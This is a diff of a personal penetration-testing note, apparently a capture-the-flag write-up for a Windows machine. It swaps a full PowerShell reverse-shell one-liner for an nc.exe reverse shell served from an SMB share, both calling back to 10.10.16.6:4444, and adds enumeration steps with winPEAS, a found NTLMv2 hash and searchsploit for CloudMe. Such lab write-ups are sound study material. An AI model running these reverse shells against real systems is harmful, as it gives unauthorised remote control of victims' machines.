@@ -64,15 +64,22 @@ rlwrap -cAr nc -nlvp 4444
 ```
 - and on the victim machine
 ```cmd
-powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.16.6', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+\\10.10.16.6\smbFolder\nc.exe -e cmd 10.10.16.6 4444
 ```
 >[!example]- Result
->![[Pasted image 20250304230220.png]]
+![[Pasted image 20250305111718.png]]
+![[Pasted image 20250305111747.png]]
+
 # Privilege Escalation
 ## Enumerating
 - Local opened ports
 >[!example]- Result
 >![[Pasted image 20250304232133.png]]
+
+- I found a .php whoes porpose is connect to the MySQL data base
+>[!example]- Result
+>![[Pasted image 20250305112224.png]]
+>![[Pasted image 20250305112801.png]]
 
 - Get local users
 ```cmd
@@ -80,16 +87,19 @@ net users
 ```
 >[!example]- Result
 >![[Pasted image 20250304235549.png]]
-- lets use [[chisel]] in order to create a proxy and get connection to this ports
-Attacker
-```bash
-./chisel server --reverse -p 1234
-```
-Victim
-```bash
-.\chisel.exe client 10.10.16.6:1234 R:9999:socks
-```
-
-- after configure proxychain we have access
+- lets use [[winPEAS]] in order to get more info, and we have NTLMv2
 >[!example]- Result
->![[Pasted image 20250304235229.png]]
+>![[Pasted image 20250305114508.png]]
+
+- But we cant crack it, there are 2 opened ports and we have full access to this executable
+>[!example]- Result
+>![[Pasted image 20250305115731.png]]
+>![[Pasted image 20250305120501.png]]
+
+- so there is a service named CloudMe version 1112 and is running, so lets find more information, and we see that her default port is 8888 and this version is vulnerable
+```bash
+searchsploit CloudMe
+```
+>[!example]- Result
+>![[Pasted image 20250305121102.png]]
+
